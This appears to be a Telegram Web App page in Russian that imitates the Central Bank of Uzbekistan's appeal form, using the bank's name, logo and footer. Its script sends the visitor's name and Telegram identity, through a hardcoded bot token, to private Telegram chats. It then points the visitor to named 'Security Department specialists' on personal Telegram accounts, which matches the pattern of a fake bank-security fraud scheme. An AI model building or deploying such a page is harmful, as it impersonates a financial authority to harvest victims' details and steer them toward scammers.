<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Отправить обращение — Центральный банк РУз</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    html, body {
      font-family: "Segoe UI", sans-serif;
      background: url("фон.jpg") no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      color: #003366;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      overscroll-behavior: none;
      touch-action: manipulation;
    }

    body * {
      box-sizing: border-box;
    }

    img.logo {
      width: 100%;
      height: auto;
      display: block;
      cursor: pointer;
      margin: 0;
      padding: 0;
    }

    .container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 12px;
      padding: 25px;
      margin-top: 10px;
      width: 92%;
      max-width: 420px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    h2 {
      color: #003366;
      font-size: 22px;
      margin-bottom: 20px;
      border-bottom: 2px solid #003366;
      padding-bottom: 8px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-top: 15px;
      font-size: 15px;
      text-align: left;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
      text-align: center;
      background-color: #f8f9fa;
    }

    select:disabled {
      color: #555;
      background-color: #e9ecef;
      appearance: none;
    }

    button {
      margin-top: 25px;
      width: 100%;
      background-color: #003366;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #004a99;
    }

    /* Модальное окно */
    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      visibility: hidden;
      z-index: 100;
    }

    .modal.active {
      visibility: visible;
    }

    .modal-content {
      background: white;
      border-radius: 12px;
      padding: 25px;
      text-align: center;
      width: 90%;
      max-width: 320px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
    }

    .modal-content p {
      font-size: 16px;
      margin-bottom: 20px;
    }

    .modal-content button {
      width: auto;
      padding: 8px 18px;
      font-size: 15px;
    }

    footer {
      text-align: center;
      color: #003366;
      font-size: 13px;
      margin: 25px 10px 15px;
      line-height: 1.5;
    }

    footer a {
      color: #003366;
      text-decoration: none;
      font-weight: 600;
    }

    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body oncontextmenu="return false;">
    <img src="лого.jpg" class="logo" alt="ЦБ РУЗ" onclick="window.location.href='https://cbu.uz/ru/'">

    <div class="container">
    <h2>Отправить обращение</h2>

    <label>Территориальное подразделение</label>
    <select disabled>
      <option>Центральный аппарат ЦБ</option>
      <option>Ташкентское областное управление</option>
      <option>Самаркандское областное управление</option>
    </select>

    <label>Департамент</label>
    <select disabled>
      <option>Департамент Безопасности</option>
      <option>Департамент ИТ</option>
      <option>Департамент финансового контроля</option>
    </select>

    <label>ФИО заявителя</label>
    <input type="text" id="fio" placeholder="Введите ФИО">

    <label>Цель обращения</label>
    <select id="purpose">
      <option value="specialist">Связь со специалистом</option>
      <option value="question">Задать вопрос</option>
      <option value="support">Обращение в поддержку</option>
      <option value="proposal">Предложения</option>
    </select>

    <div id="specialist-section" style="display:block;">
      <label>Табельный номер специалиста</label>
      <input type="text" id="tabnum" placeholder="Например: 041483">
    </div>

    <div id="question-section" style="display:none;">
      <label>Укажите ваш вопрос</label>
      <input type="text" id="question" placeholder="Введите ваш вопрос">
    </div>

    <button id="sendBtn">Отправить запрос</button>
  </div>

    <div class="modal" id="modal">
    <div class="modal-content" id="modal-content">
      <p id="modal-text">Запрос отправлен, ожидайте ответа</p>
      <button id="closeModal">Закрыть</button>
     </div>
  </div>

    <footer>
    © 2005–2025<br>
    Центральный банк Республики Узбекистан, официальный сайт.<br>
    Дизайн и разработка сайта <a href="https://pixelcraft.uz/">Pixelcraft</a>
  </footer>

  <script>
    const tg = window.Telegram.WebApp;
    const fioInput = document.getElementById('fio');
    const tabnumInput = document.getElementById('tabnum');
    const purposeSelect = document.getElementById('purpose');
    const questionInput = document.getElementById('question'); // Добавлено получение поля вопроса
    const sendBtn = document.getElementById('sendBtn');
    const modal = document.getElementById('modal');
    const modalText = document.getElementById('modal-text');
    const closeModal = document.getElementById('closeModal');

    // Chat ID для общих обращений
    const GENERAL_CHAT_ID = 7048297998; 

    // запрет масштабирования
    document.addEventListener('wheel', e => { if (e.ctrlKey) e.preventDefault(); }, { passive: false });
    document.addEventListener('gesturestart', e => e.preventDefault());
    document.addEventListener('gesturechange', e => e.preventDefault());
    document.addEventListener('gestureend', e => e.preventDefault());

    // список специалистов
    const managers = {
      "041483": {
        fio: "Хайруллин Дмитрий Шамилевич",
        title: "Специалист Департамента Безопасности **Хайруллин Дмитрий Шамилевич**",
        link: "https://t.me/m/9CzX_flWZDhi",
        chat_id: 7698094195
      },
      "112437": {
        fio: "Рымкулов Бахыт Алимжонович",
        title: "Старший Специалист Департамента Безопасности **Рымкулов Бахыт Алимжонович**",
        link: "https://t.me/Uz_MB1",
        chat_id: 7814377002
      },
    };

    const token = "7571144445:AAHZD5LCp81Taf-dgPo2Jw894rz1JqbdgI4";

    purposeSelect.addEventListener("change", () => {
      const purpose = purposeSelect.value;
      // Получение текстового описания цели
      const purposeText = purposeSelect.options[purposeSelect.selectedIndex].text; 

      document.getElementById("specialist-section").style.display = purpose === "specialist" ? "block" : "none";
      document.getElementById("question-section").style.display = purpose === "specialist" ? "none" : "block";
      
      // Обновление заголовка для секции вопроса/обращения
      document.querySelector('#question-section label').textContent = (purpose === "question" ? "Укажите ваш вопрос" : 
                                                                                purpose === "support" ? "Опишите проблему" : 
                                                                                purpose === "proposal" ? "Опишите ваше предложение" : 
                                                                                "Введите текст обращения");
    });

    sendBtn.addEventListener("click", async () => {
      const fio = fioInput.value.trim();
      const tab = tabnumInput.value.trim();
      const purpose = purposeSelect.value;
      const purposeText = purposeSelect.options[purposeSelect.selectedIndex].text;
      const client = tg.initDataUnsafe?.user;
      const clientName = `${client?.first_name || ""} ${client?.last_name || ""}`.trim();
      const username = client?.username ? `@${client.username}` : "—";

      if (!fio) return showModal("Пожалуйста, введите ФИО заявителя.");

      // --- ОБРАБОТКА ОБЩИХ ОБРАЩЕНИЙ ---
      if (purpose !== "specialist") {
        const question = questionInput.value.trim() || '—';

        if (!question || question.length < 5) {
          return showModal("Пожалуйста, введите текст вашего обращения (минимум 5 символов).", () => questionInput.focus());
        }

        const textForGeneralChat =
          `📬 Новое общее обращение\n` +
          `**🎯 Цель:** ${purposeText}\n` +
          `----------------------------\n` +
          `📝 Текст обращения:\n` +
          `\`\`\`\n${question}\n\`\`\`\n` +
          `----------------------------\n` +
          `👤 ФИО (из формы): ${fio}\n` +
          `👤 ФИО (в Telegram): ${clientName}\n` +
          `🌐 Username: ${username}\n` +
          `🆔 Chat ID: \`${client?.id}\``;

        try {
          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: GENERAL_CHAT_ID,
              text: textForGeneralChat,
              parse_mode: "Markdown" // Используем Markdown для форматирования
            })
          });
          showModal("Запрос отправлен, ожидайте ответа ✔", () => tg.close());
        } catch (error) {
          console.error("Ошибка при отправке в общий чат:", error);
          showModal("Ошибка при отправке запроса. Попробуйте позже.", () => tg.close());
        }
        return;
      }

      // --- ОБРАБОТКА "СВЯЗЬ СО СПЕЦИАЛИСТОМ" ---
      if (!managers[tab]) {
        showModal("❌ Специалиста с этим номером нет.", () => tabnumInput.focus());
        return;
      }

      const manager = managers[tab];

      const textForManager =
        `📨 Новая заявка!\n` +
        `👤 ФИО (из формы): ${fio}\n` +
        `👤 ФИО (в Telegram): ${clientName}\n` +
        `🌐 Username: ${username}\n` +
        `🆔 Chat ID: <code>${client?.id}</code>`;

      try {
        // 1. Отправка менеджеру
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: manager.chat_id,
            text: textForManager,
            parse_mode: "HTML"
          })
        });

        // 2. Отправка пользователю (ссылка на чат)
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: client.id,
            text: manager.title,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [[{ text: "Перейти в чат", url: manager.link }]]
            }
          })
        });

        showModal("Запрос принят ✔", () => tg.close());
      } catch (error) {
        console.error("Ошибка при отправке специалисту:", error);
        showModal("Ошибка при отправке запроса. Попробуйте позже.", () => tg.close());
      }
    });

    function showModal(text, onClose) {
      modalText.textContent = text;
      modal.classList.add("active");
      closeModal.onclick = () => {
        modal.classList.remove("active");
        if (onClose) onClose();
      };
    }
  </script>
</body>
</html>
